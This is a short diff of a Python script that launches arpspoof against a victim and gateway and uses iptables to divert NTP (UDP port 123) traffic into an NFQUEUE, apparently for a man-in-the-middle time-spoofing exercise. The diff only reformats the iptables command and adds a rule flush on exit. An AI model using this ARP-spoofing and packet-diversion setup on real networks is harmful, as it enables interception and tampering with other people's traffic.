@@ -75,8 +75,7 @@ def main():  # no arguments
     q = Popen(['arpspoof', '-t', vict, gateway], stderr=DEVNULL, stdout=DEVNULL)
 
 
-    os.system('iptables -t raw -A PREROUTING -p udp -d '
-              + gateway + ' --sport 123 -j NFQUEUE --queue-num 99')
+    os.system('iptables -t raw -A PREROUTING -p udp -d ' + gateway + ' --sport 123 -j NFQUEUE --queue-num 99')
     """
     -t : tables we use raw: for nfqueue types - prerouting (for packets arriving from any network interface) and output
     -A : Append rule to the said table
@@ -94,6 +93,8 @@ def main():  # no arguments
         nfqueue.run()
     except KeyboardInterrupt:
         print("Spoofing stopped")
+        os.system('iptables -F -vt raw') #hey
+
 
 """
 print("main")
